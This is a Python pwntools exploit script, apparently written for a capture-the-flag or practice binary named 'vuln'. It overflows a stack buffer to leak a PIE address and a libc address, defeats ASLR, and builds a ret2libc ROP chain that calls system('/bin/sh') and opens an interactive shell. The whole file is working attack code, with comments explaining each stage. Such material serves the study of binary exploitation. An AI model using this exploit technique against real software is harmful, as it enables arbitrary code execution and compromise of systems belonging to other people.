#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

overflow_offset_to_rip = 280

p = process("./vuln")
e = ELF("./vuln")
gdb.attach(p, api=True)

# -- LEAK #1 -  `main()` address since this binary is PIE.
payload = b"A" * overflow_offset_to_rip

p.sendafter(b"Hey, whats your name!?\n", payload)
p.recvuntil(b"Welcome \n" + payload)

# # Why read 6 bytes and pad MSB with 0x00 0x00?
# # The vulnerable program doesn't send these bytes, since `read` stops at the
# # null-terminator. If we read 8 bytes we get the line feed and extra bytes
# from the program's stdout message...
leak_main = u64(p.recv(6).ljust(8, b"\x00"))
leak_main = leak_main - 14  # The leak is `main+14`.
main_offset = e.symbols["main"]
# calc base address
vuln_base = leak_main - main_offset
info(f"vuln base: {hex(vuln_base)}")

pause()

p.sendafter(b"is this name correct? (y/n)?\n", b"n\n")

# -- LEAK #2 - LIBC ADDR (defeat ASLR)
payload = b"A" * overflow_offset_to_rip
payload += b"B" * 8
payload += b"C" * 8

p.sendafter(b"Hey, whats your name!?\n", payload)
p.recvuntil(b"Welcome \n" + payload)

leak_libc = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"libc_leak: {hex(leak_libc)}")

"""
    In [94]: hex(0x00007ffff7dc560a - 0x7fbdfae97000)
    Out[94]: '0x2760a'
"""
libc_base = leak_libc - 0x276B5
info(f"libc_base: {hex(libc_base)}")

pause()

p.sendafter(b"is this name correct? (y/n)?\n", b"n\n")

# Final payload!

libc_system = libc_base + e.libc.symbols["system"]
info(f"libc_system = {hex(libc_system)}")

libc_bin_sh = libc_base + next(e.libc.search(b"/bin/sh"))
info(f"libc_bin_sh = {hex(libc_bin_sh)}")

rop = ROP(e)
pop_rdi_ret_offset = rop.find_gadget(["pop rdi", "ret"]).address
pop_rdi_ret = vuln_base + pop_rdi_ret_offset
info(f"pop rdi; ret; = {hex(pop_rdi_ret)}")

ret_offset = rop.find_gadget(["ret"]).address
ret = vuln_base + ret_offset
info(f"ret = {hex(ret)}")

# construct payload
payload = b"A" * overflow_offset_to_rip
payload += p64(pop_rdi_ret)
payload += p64(libc_bin_sh)
# align the stack to 16-bytes so `movaps` instruction in `system()` doesn't crash
payload += p64(ret)
payload += p64(libc_system)

# send final payload
p.sendafter(b"Hey, whats your name!?\n\n", payload)

pause()

p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
